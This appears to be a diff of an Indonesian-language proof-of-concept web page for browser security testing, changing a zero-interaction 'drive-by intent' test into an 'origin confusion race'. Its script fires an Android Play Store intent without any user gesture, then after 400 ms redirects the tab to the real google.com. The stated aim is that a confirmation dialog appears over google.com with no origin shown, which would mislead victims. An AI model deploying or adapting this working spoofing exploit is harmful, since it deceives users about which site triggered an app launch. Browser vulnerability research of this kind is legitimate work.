@@ -24,52 +24,42 @@
 </style>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PoC #5b - Drive-by Intent (nol interaksi)</title>
+<title>PoC #5c - Origin Confusion Race</title>
 <style>
   body{font-family:sans-serif;padding:20px;margin:0;text-align:center;}
   .warn{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:12px 0;}
   .note{background:#e7f3ff;border:1px solid #2196F3;padding:10px;margin:12px 0;text-align:left;}
   #count{font-size:64px;font-weight:bold;margin:20px 0;}
-  #log{background:#111;color:#0f0;padding:10px;font-family:monospace;font-size:12px;
-       white-space:pre-wrap;word-break:break-all;margin:12px 0;text-align:left;min-height:60px;}
 </style>
 </head>
 <body>
-<h2>PoC #5b &mdash; Drive-by Intent (nol interaksi)</h2>
-<div class="warn"><b>HANYA untuk pengujian keamanan.</b> Halaman ini TIDAK punya tombol apa pun.</div>
-<div class="note"><b>Cara uji:</b>
+<h2>PoC #5c &mdash; Origin Confusion (race)</h2>
+<div class="warn"><b>HANYA untuk pengujian keamanan.</b></div>
+<div class="note"><b>Skenario yang diuji:</b>
 <ol>
-<li>Buka URL halaman ini di <b>tab baru</b>.</li>
-<li><b>JANGAN sentuh apa pun</b> &mdash; jangan tap, jangan scroll.</li>
-<li>Hitungan mundur berjalan otomatis, lalu intent ditembakkan.</li>
-<li>Catat: apakah aplikasi Play Store terbuka sendiri? Apakah ada dialog konfirmasi?</li>
-</ol></div>
+<li>Halaman ini menembak <b>intent</b> ke Play Store <b>tanpa interaksi</b>.</li>
+<li>Sepersekian detik kemudian, tab <b>dipindah ke google.com yang asli</b>.</li>
+<li>Pertanyaan: apakah dialog konfirmasi tetap muncul <b>di atas google.com</b>?</li>
+<li>Kalau iya &rarr; korban melihat google.com asli + dialog tanpa nama origin &rarr; <b>origin confusion berhasil</b>.</li>
+</ol>
+<b>JANGAN sentuh apa pun.</b></div>
 <div id="count">5</div>
-<p>Intent akan ditembakkan otomatis dalam <b><span id="c2">5</span> detik</b> tanpa interaksi apa pun.</p>
-<div class="note"><b>Log:</b><div id="log">halaman dimuat...</div></div>
-<div class="note"><b>Yang dicatat:</b>
-<ol>
-<li>Apakah Play Store terbuka <b>tanpa tap sama sekali</b>?</li>
-<li>Apakah muncul <b>dialog konfirmasi</b> sebelum aplikasi terbuka? (bandingkan Edge vs Chrome)</li>
-<li>Apakah nama/asal situs ditampilkan di dialog (kalau ada)?</li>
-</ol></div>
+<p>Dalam <b><span id="c2">5</span> detik</b>: tembak intent, lalu pindah ke google.com</p>
 <script>
 var INTENT = 'intent://details?id=com.whatsapp#Intent;scheme=market;package=com.android.vending;end';
-function log(m){
-  var el = document.getElementById('log');
-  el.textContent += '\n' + new Date().toLocaleTimeString() + ' ' + m;
-}
 var sisa = 5;
-log('tidak ada tombol di halaman ini. menunggu ' + sisa + ' detik...');
 var t = setInterval(function(){
   sisa--;
   document.getElementById('count').textContent = sisa;
   document.getElementById('c2').textContent = sisa;
   if(sisa <= 0){
     clearInterval(t);
-    log('MENEMBAK INTENT tanpa gesture: ' + INTENT);
+    // 1. tembak intent (tanpa gesture)
     window.location.href = INTENT;
-    setTimeout(function(){ log('masih di halaman (intent diblokir / butuh konfirmasi yang ditolak)'); }, 3000);
+    // 2. balapan: langsung pindah ke google.com asli
+    setTimeout(function(){
+      window.location.href = 'https://www.google.com';
+    }, 400);
   }
 }, 1000);
 </script>
